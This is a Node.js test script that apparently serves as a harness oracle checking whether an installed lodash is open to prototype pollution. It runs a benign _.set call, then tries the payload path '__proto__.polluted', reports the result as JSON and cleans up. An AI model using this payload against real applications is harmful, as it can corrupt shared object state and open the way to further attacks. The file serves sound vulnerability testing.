'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let _;
try {
  _ = require('lodash');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle_' + process.pid + '_' + Date.now();
const tmpFile = path.join(os.tmpdir(), marker + '.json');

let operation_completed = false;
let evidence = '';

function cleanupPollution() {
  try {
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')) {
      delete Object.prototype.polluted;
    }
  } catch (e) { /* ignore */ }
}

// Ensure a clean slate before we start (defensive, in case of leftover state).
cleanupPollution();

try {
  // --- Benign operation first ---
  // _.set builds a nested structure on a plain, freshly created object using a safe dotted path.
  const benignTarget = {};
  const benignResult = _.set(benignTarget, 'a.b.c', 1);

  const benignOk =
    benignResult &&
    benignResult.a &&
    benignResult.a.b &&
    benignResult.a.b.c === 1;

  if (!benignOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign _.set did not produce expected shape: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  // Touch /tmp with a unique marker to confirm filesystem fixture access works, per harness convention.
  fs.writeFileSync(tmpFile, JSON.stringify({ marker, benignResult }));
  const readBack = JSON.parse(fs.readFileSync(tmpFile, 'utf8'));
  if (!readBack || readBack.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'tmp fixture roundtrip failed' });
    process.exit(0);
  }
  try { fs.unlinkSync(tmpFile); } catch (e) { /* ignore cleanup errors */ }

  // Benign operation succeeded: only now may operation_completed become true.
  operation_completed = true;

  // --- Malicious operation ---
  // CVE-2018-3721 / CVE-2019-10744-style prototype pollution via a dotted path
  // whose first segment is '__proto__'. In vulnerable lodash, _.set's internal
  // baseSet walks the path and ends up assigning onto Object.prototype.
  const maliciousTarget = {};

  let threwDuringMalicious = false;
  let maliciousErrMsg = '';
  try {
    _.set(maliciousTarget, '__proto__.polluted', 'yes');
  } catch (callErr) {
    threwDuringMalicious = true;
    maliciousErrMsg = String(callErr && callErr.message);
  }

  // Check pollution on a completely new, unrelated plain object literal,
  // never touched by either call above.
  const freshObj = {};
  const ownCheck = Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted');
  const polluted = freshObj.polluted === 'yes';
  const exploit_succeeded = !!(polluted && ownCheck);

  if (threwDuringMalicious) {
    evidence = 'malicious _.set threw: ' + maliciousErrMsg + '; Object.prototype.hasOwnProperty(polluted)=' + String(ownCheck) + '; fresh {}.polluted=' + String(freshObj.polluted);
  } else {
    evidence = exploit_succeeded
      ? 'Object.prototype.polluted === "yes" after _.set({}, "__proto__.polluted", "yes"); fresh {}.polluted=' + String(freshObj.polluted)
      : 'No pollution observed on Object.prototype after malicious _.set; fresh {}.polluted=' + String(freshObj.polluted) + '; ownCheck=' + String(ownCheck);
  }

  cleanupPollution();

  finish({ operation_completed: true, exploit_succeeded, evidence });
} catch (unexpectedErr) {
  cleanupPollution();
  if (operation_completed) {
    finish({ operation_completed: true, exploit_succeeded: false, evidence: 'unexpected exception after benign success, treated as blocked: ' + String(unexpectedErr && unexpectedErr.message) });
  } else {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception before benign success: ' + String(unexpectedErr && unexpectedErr.message) });
  }
}
